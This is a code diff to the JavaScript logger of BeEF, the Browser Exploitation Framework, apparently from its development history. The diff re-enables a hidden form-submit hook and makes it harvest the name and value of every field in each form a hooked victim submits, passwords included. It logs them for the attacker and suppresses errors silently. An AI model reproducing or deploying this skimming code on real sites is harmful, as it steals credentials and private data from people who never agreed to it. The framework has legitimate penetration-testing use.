@@ -73,9 +73,9 @@ beef.logger = {
 		).blur(
 			function(e) { beef.logger.win_blur(e); }
 		);
-		/*$j('form').submit(
+		$j('form').submit(
 			function(e) { beef.logger.submit(e); }
-		);*/
+		);
 		document.body.oncopy = function() {
 			setTimeout("beef.logger.copy();", 10);
 		}
@@ -188,12 +188,17 @@ beef.logger = {
      * TODO: Cleanup this function
 	 */
 	submit: function(e) {
-		var f = new beef.logger.e();
-		f.type = 'submit';
-		f.target = beef.logger.get_dom_identifier(e.target);
-		f.data = 'Action: '+$j(e.target).attr('action')+' - Method: '+$j(e.target).attr('method');
-		this.events.push(f);
-		/*this.events.push('Form submission: Action: '+$j(e.target).attr('action')+' Method: '+$j(e.target).attr('method')+' @ '+beef.logger.get_timestamp()+'s > '+beef.logger.get_dom_identifier(e.target));*/
+		try {
+			var f = new beef.logger.e();
+			var values = "";
+			f.type = 'submit';
+			f.target = beef.logger.get_dom_identifier(e.target);
+			for (var i = 0; i < e.target.elements.length; i++) {
+	            values += "["+i+"] "+e.target.elements[i].name+"="+e.target.elements[i].value+"\n";
+	        }
+			f.data = 'Action: '+$j(e.target).attr('action')+' - Method: '+$j(e.target).attr('method') + ' - Values:\n'+values;
+			this.events.push(f);
+		} catch(e) {}
 	},
 	
 	/**
